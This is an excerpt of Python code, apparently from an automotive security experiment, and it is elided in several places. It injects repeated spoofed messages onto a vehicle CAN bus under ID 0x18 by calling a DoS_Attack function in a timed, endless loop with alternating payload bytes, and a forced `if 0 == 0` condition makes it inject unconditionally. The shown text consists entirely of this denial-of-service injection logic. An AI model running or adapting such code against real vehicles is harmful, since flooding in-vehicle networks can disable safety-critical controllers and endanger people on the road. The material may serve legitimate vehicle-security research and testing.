...
def msg_injector(loop_counter, injection_id, inject_data):
    for _ in range(loop_counter):
        time.sleep(0.03)
        DoS_Attack(injection_id, inject_data)
...
if __name__ == "__main__":
    ...
    #         break
    cnt_b = 0
    inject_counter = [[4, 2, 4, 3], [4, 2, 5, 3]]
    while True:
        injection_id = "0018"
        # mess = CAN.Read(CAN_BUS)
        # if hex(mess[1].ID) == "0x18":
        ...
        if 0 == 0:
            temp = cnt_b / 14
            loop_counter = (inject_counter[0] if int(temp % 2) == 0 else inject_counter[1])
            using_bytes[5] = msg_dict[5][0][3 if cnt_b % 2 == 0 else 0]
            try:
                msg_injector(loop_counter[cnt_b % 4], injection_id, using_bytes)
                cnt_b += 1            
            except:
                print("Sum Tin Wong")
            print("Cycle ends #{0}. temp: {1}".format(cnt_b, temp))